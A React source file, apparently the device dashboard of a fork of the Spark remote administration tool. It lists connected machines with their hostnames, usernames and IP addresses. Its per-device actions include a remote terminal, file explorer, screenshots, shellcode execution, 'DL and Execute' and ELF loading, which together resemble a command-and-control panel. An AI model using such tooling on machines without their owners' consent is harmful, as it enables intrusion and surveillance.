import React, {useEffect, useRef, useState} from 'react';
import ProTable, {TableDropdown} from '@ant-design/pro-table';
import {Button, Image, message, Modal, Progress, Tooltip} from 'antd';
import { catchBlobReq, formatSize, request, tsToTime, waitTime, renderUnixEpochToHumanReadable } from "../utils/utils";
import {QuestionCircleOutlined} from "@ant-design/icons";
import i18n from "../locale/locale";

// DO NOT EDIT OR DELETE THIS COPYRIGHT MESSAGE.
console.log("%c By XZB %c https://github.com/XZB-1248/Spark", 'font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:64px;color:#00bbee;-webkit-text-fill-color:#00bbee;-webkit-text-stroke:1px#00bbee;', 'font-size:12px;');

let ComponentMap = {
	Generate: null,
	Explorer: null,
	Terminal: null,
	ProcMgr: null,
	Desktop: null,
	Execute: null,
	Shellcode: null,
	Executable: null,
	Loadelf: null,
};

function overview(props) {
	const [loading, setLoading] = useState(false);
	const [execute, setExecute] = useState(false);
	const [shellcode, setShellcode] = useState(false);
	const [executable, setExecutable] = useState(false);
	const [loadelf, setLoadelf] = useState(false);
	const [desktop, setDesktop] = useState(false);
	const [procMgr, setProcMgr] = useState(false);
	const [explorer, setExplorer] = useState(false);
	const [generate, setGenerate] = useState(false);
	const [terminal, setTerminal] = useState(false);
	const [screenBlob, setScreenBlob] = useState('');
	const [dataSource, setDataSource] = useState([]);

	const columns = [
		{
			key: 'hostname',
			title: i18n.t('OVERVIEW.HOSTNAME'),
			dataIndex: 'hostname',
			ellipsis: true,
			width: 100
		},
		{
			key: 'username',
			title: i18n.t('OVERVIEW.USERNAME'),
			dataIndex: 'username',
			ellipsis: true,
			width: 90
		},
		{
			key: 'os',
			title: i18n.t('OVERVIEW.OS'),
			dataIndex: 'os',
			ellipsis: true,
			width: 80
		},
		{
			key: 'lan',
			title: 'LAN',
			dataIndex: 'lan',
			ellipsis: true,
			width: 100
		},
		{
			key: 'wan',
			title: 'WAN',
			dataIndex: 'wan',
			ellipsis: true,
			width: 100
		},
		{
			key: 'clientuptime',
			title: 'Client Uptime',
			dataIndex: 'clientuptime',
			ellipsis: true,
			renderText: renderUnixEpochToHumanReadable,
			width: 50
		},
		{
			key: 'uptime',
			title: i18n.t('OVERVIEW.UPTIME'),
			dataIndex: 'uptime',
			ellipsis: true,
			renderText: tsToTime,
			width: 50
		},
		{
			key: 'option',
			title: i18n.t('OVERVIEW.OPERATIONS'),
			dataIndex: 'id',
			valueType: 'option',
			ellipsis: false,
			render: (_, device) => renderOperation(device),
			width: 170
		},
	];
	const options = {
		show: true,
		density: true,
		setting: true,
	};
	const tableRef = useRef();
	const loadComponent = (component, callback) => {
		let element = null;
		component = component.toLowerCase();
		Object.keys(ComponentMap).forEach(k => {
			if (k.toLowerCase() === component.toLowerCase()) {
				element = k;
			}
		});
		if (!element) return;
		if (ComponentMap[element] === null) {
			import('../components/'+component+'/'+component).then((m) => {
				ComponentMap[element] = m.default;
				callback();
			});
		} else {
			callback();
		}
	}

	useEffect(() => {
		// auto update is only available when all modal are closed.
		if (!execute && !shellcode && !desktop && !procMgr && !explorer && !generate && !terminal) {
			let id = setInterval(getData, 3000);
			return () => {
				clearInterval(id);
			};
		}
	}, [execute, shellcode, desktop, procMgr, explorer, generate, terminal]);


	function renderOperation(device) {
		let menus = [
			{key: 'execute', name: i18n.t('OVERVIEW.EXECUTE')},
			{key: 'executable', name: "DL and Execute"},
			{key: 'loadelf', name: "Load ELF"},
			{key: 'shellcode', name: i18n.t('OVERVIEW.SHELLCODE')},
			{key: 'desktop', name: i18n.t('OVERVIEW.DESKTOP')},
			{key: 'screenshot', name: i18n.t('OVERVIEW.SCREENSHOT')},
			{key: 'restart', name: i18n.t('OVERVIEW.RESTART')},
			{key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN')},
			{key: 'KILL', name: 'KILL'},
		];
		return [
			<a key='terminal' onClick={() => onMenuClick('terminal', device)}>{i18n.t('OVERVIEW.TERMINAL')}</a>,
			<a key='explorer' onClick={() => onMenuClick('explorer', device)}>{i18n.t('OVERVIEW.EXPLORER')}</a>,
			<a key='procmgr' onClick={() => onMenuClick('procmgr', device)}>{i18n.t('OVERVIEW.PROC_MANAGER')}</a>,
			<TableDropdown
				key='more'
				onSelect={key => onMenuClick(key, device)}
				menus={menus}
			/>,
		]
	}

	function onMenuClick(act, value) {

		const device = value;
		let hooksMap = {
			terminal: setTerminal,
			explorer: setExplorer,
			generate: setGenerate,
			procmgr: setProcMgr,
			execute: setExecute,
			executable: setExecutable,
			loadelf: setLoadelf,
			shellcode: setShellcode,
			desktop: setDesktop,
		};
		if (hooksMap[act]) {
			setLoading(true);
			loadComponent(act, () => {
				hooksMap[act](device);
				setLoading(false);
			});
			return;
		}
		if (act === 'screenshot') {
			request('/api/device/screenshot/get', {device: device.id}, {}, {
				responseType: 'blob'
			}).then(res => {
				if ((res.data.type ?? '').substring(0, 5) === 'image') {
					if (screenBlob.length > 0) {
						URL.revokeObjectURL(screenBlob);
					}
					setScreenBlob(URL.createObjectURL(res.data));
				}
			}).catch(catchBlobReq);
			return;
		}

		Modal.confirm({
			okText:"Yes",
        	cancelText:"No",
			title: i18n.t('OVERVIEW.OPERATION_CONFIRM').replace('{0}', i18n.t('OVERVIEW.'+act.toUpperCase())),
			icon: <QuestionCircleOutlined/>,
			onOk() {
				request('/api/device/' + act, {device: device.id}).then(res => {
					let data = res.data;
					if (data.code === 0) {
						message.success(i18n.t('OVERVIEW.OPERATION_SUCCESS'));
						tableRef.current.reload();
					}
				});
			}
		});
	}

	function toolBar() {
		//return
		return (
			<Button type='primary' onClick={() => onMenuClick('generate', true)}>{i18n.t('OVERVIEW.GENERATE')}</Button>
		)
	}

	async function getData(form) {
		await waitTime(300);
		let res = await request('/api/device/list');
		let data = res.data;
		if (data.code === 0) {
			let result = [];
			for (const uuid in data.data) {
				let temp = data.data[uuid];
				temp.conn = uuid;
				result.push(temp);
			}
			// Iterate all object and expand them.
			for (let i = 0; i < result.length; i++) {
				for (const k in result[i]) {
					if (typeof result[i][k] === 'object') {
						for (const key in result[i][k]) {
							result[i][k + '_' + key] = result[i][k][key];
						}
					}
				}
			}
			result = result.sort((first, second) => {
				let firstEl = first.hostname.toUpperCase();
				let secondEl = second.hostname.toUpperCase();
				if (firstEl < secondEl) return -1;
				if (firstEl > secondEl) return 1;
				return 0;
			});
			result = result.sort((first, second) => {
				let firstEl = first.os.toUpperCase();
				let secondEl = second.os.toUpperCase();
				if (firstEl < secondEl) return -1;
				if (firstEl > secondEl) return 1;
				return 0;
			});
			setDataSource(result);
			return ({
				data: result,
				success: true,
				total: result.length
			});
		}
		return ({data: [], success: false, total: 0});
	}

	return (
		<>
			<Image
				preview={{
					visible: !!screenBlob,
					src: screenBlob,
					onVisibleChange: () => {
						URL.revokeObjectURL(screenBlob);
						setScreenBlob('');
					}
				}}
			/>
			{
				ComponentMap.Generate &&
				<ComponentMap.Generate
					visible={generate}
					onVisibleChange={setGenerate}
				/>
			}
			{
				ComponentMap.Execute &&
				<ComponentMap.Execute
					visible={execute}
					device={execute}
					onCancel={setExecute.bind(null, false)}
				/>
			}
			{
				ComponentMap.Shellcode &&
				<ComponentMap.Shellcode
					visible={shellcode}
					device={shellcode}
					onCancel={setShellcode.bind(null, false)}
				/>
			}
			{
				ComponentMap.Executable &&
				<ComponentMap.Executable
					visible={executable}
					device={executable}
					onCancel={setExecutable.bind(null, false)}
				/>
			}
			{
				ComponentMap.Loadelf &&
				<ComponentMap.Loadelf
					visible={loadelf}
					device={loadelf}
					onCancel={setLoadelf.bind(null, false)}
				/>
			}
			{
				ComponentMap.Explorer &&
				<ComponentMap.Explorer
					open={explorer}
					device={explorer}
					onCancel={setExplorer.bind(null, false)}
				/>
			}
			{
				ComponentMap.ProcMgr &&
				<ComponentMap.ProcMgr
					open={procMgr}
					device={procMgr}
					onCancel={setProcMgr.bind(null, false)}
				/>
			}
			{
				ComponentMap.Desktop &&
				<ComponentMap.Desktop
					open={desktop}
					device={desktop}
					onCancel={setDesktop.bind(null, false)}
				/>
			}
			{
				ComponentMap.Terminal &&
				<ComponentMap.Terminal
					open={terminal}
					device={terminal}
					onCancel={setTerminal.bind(null, false)}
				/>
			}
			{
				ComponentMap.Shellcode &&
				<ComponentMap.Shellcode
					open={shellcode}
					device={shellcode}
					onCancel={setShellcode.bind(null, false)}
				/>
			}
			<ProTable
				scroll={{
					x: 'max-content',
					scrollToFirstRowOnChange: true
				}}
				rowKey='id'
				search={false}
				options={options}
				columns={columns}
				columnsState={{
					persistenceKey: 'columnsState',
					persistenceType: 'localStorage'
				}}
				onLoadingChange={setLoading}
				loading={loading}
				request={getData}
				pagination={false}
				actionRef={tableRef}
				toolBarRender={toolBar}
				dataSource={dataSource}
				onDataSourceChange={setDataSource}
			/>
		</>
	);
}
function UsageBar(props) {
	let {usage} = props;
	usage = usage || 0;
	usage = Math.round(usage * 100) / 100;

	return (
		<Tooltip
			title={props.title??`${usage}%`}
			overlayInnerStyle={{
				whiteSpace: 'nowrap',
				wordBreak: 'keep-all',
				maxWidth: '300px',
			}}
			overlayStyle={{
				maxWidth: '300px',
			}}
		>
			<Progress percent={usage} showInfo={false} strokeWidth={12} trailColor='#FFECFF'/>
		</Tooltip>
	);
}

function wrapper(props) {
	let Component = overview;
	return (<Component {...props} key={Math.random()}/>)
}

export default wrapper;